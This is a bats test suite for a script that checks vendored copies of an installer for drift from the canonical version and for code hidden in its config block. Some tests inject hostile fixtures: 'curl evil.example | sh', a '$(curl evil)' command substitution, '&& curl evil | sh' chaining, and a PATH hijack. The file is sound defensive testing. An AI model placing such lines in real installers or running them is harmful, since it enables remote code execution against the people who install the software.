#!/usr/bin/env bats
# The vendored-installer drift check (D36): a consumer's install.sh must be
# byte-identical to the canonical release-ci installer everywhere outside the
# per-consumer "vendored config" block. Fixtures are derived from the real
# canonical installer so they track it — a change to the canonical doesn't
# stale these tests. Runs under $SUT_SHELL (CI: bash and dash), same discipline
# as the installer suite.

bats_require_minimum_version 1.5.0

setup() {
  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/.." && pwd)"
  SUT_SHELL="${SUT_SHELL:-sh}"
  SUT="$REPO_ROOT/release-dryrun/assert-vendored-installer.sh"
  CANON="$REPO_ROOT/installer/install.sh"
  VENDOR="$BATS_TEST_TMPDIR/install.sh"
}

# vendor [repo] [bin] — write a clean vendored copy: the canonical installer
# with its config block filled in. Defaults to a gostow-style vendor.
vendor() {
  local repo="${1:-rocne/gostow}" bin="${2:-gostow}"
  sed -e "s|^REPO=\"\"|REPO=\"$repo\"|" -e "s|^BIN=\"\"|BIN=\"$bin\"|" "$CANON" >"$VENDOR"
}

@test "clean vendored copy passes" {
  vendor
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 0 ]
  [[ "$output" == *"OK"* ]]
}

@test "canonical resolves automatically when no canonical arg is given" {
  vendor
  run "$SUT_SHELL" "$SUT" "$VENDOR"
  [ "$status" -eq 0 ]
}

@test "different config-block values (repo/bin) are not drift" {
  vendor rocne/dot-dagger dotd
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 0 ]
}

@test "the whole config block is ignored, not just repo/bin" {
  # SIGNER_REPO lives in the block too — a change there is intentionally not
  # flagged (the block is per-consumer config by design; #11 may vary it).
  vendor
  sed -i 's|^SIGNER_REPO=.*|SIGNER_REPO="rocne/other"  # in-block, ignored|' "$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 0 ]
}

@test "drift below the config block fails" {
  vendor
  printf '%s\n' 'echo tampered' >>"$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"drifted"* ]]
}

@test "drift above the config block (header) fails" {
  vendor
  sed -i '2s/$/ DRIFT/' "$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"drifted"* ]]
}

@test "missing consumer argument is a usage error (exit 2)" {
  run "$SUT_SHELL" "$SUT"
  [ "$status" -eq 2 ]
  [[ "$output" == *"no consumer install.sh"* ]]
}

@test "missing file is a usage error (exit 2)" {
  run "$SUT_SHELL" "$SUT" "$BATS_TEST_TMPDIR/nope.sh" "$CANON"
  [ "$status" -eq 2 ]
  [[ "$output" == *"file not found"* ]]
}

@test "a copy missing the config markers is a structural error (exit 2)" {
  vendor
  grep -v '^# ---- vendored config' "$VENDOR" >"$VENDOR.tmp" && mv "$VENDOR.tmp" "$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 2 ]
  [[ "$output" == *"markers not found"* ]]
}

# inject LINE just before the end-of-config marker, i.e. inside the block.
inject_in_block() {
  awk -v line="$1" '/^# ---- end vendored config/ { print line } { print }' \
    "$VENDOR" >"$VENDOR.tmp" && mv "$VENDOR.tmp" "$VENDOR"
}

@test "a bare command hidden in the config block fails (exit 1)" {
  vendor
  inject_in_block 'curl evil.example | sh'
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"unsanctioned"* ]]
  [[ "$output" == *"curl evil.example"* ]]
}

@test "a command substitution in a sanctioned assignment fails (exit 1)" {
  vendor
  sed -i 's|^REPO=.*|REPO="$(curl evil)"|' "$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"unsanctioned"* ]]
}

@test "statement chaining after a sanctioned value fails (exit 1)" {
  vendor
  sed -i 's|^REPO=.*|REPO="rocne/gostow" \&\& curl evil \| sh|' "$VENDOR"
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"unsanctioned"* ]]
}

@test "an assignment to a non-sanctioned variable in the block fails (exit 1)" {
  vendor
  inject_in_block 'PATH=/evil:$PATH'
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 1 ]
  [[ "$output" == *"unsanctioned"* ]]
}

@test "the canonical BIN default is allowed inside the block" {
  # a consumer that moves the default line up into the block is still valid: it
  # assigns BIN, the one sanctioned exception with an expansion in its value.
  vendor
  inject_in_block 'BIN="${BIN:-${REPO##*/}}"'
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 0 ]
}

@test "an extra comment inside the block is allowed" {
  vendor
  inject_in_block '# a vendoring note'
  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
  [ "$status" -eq 0 ]
}
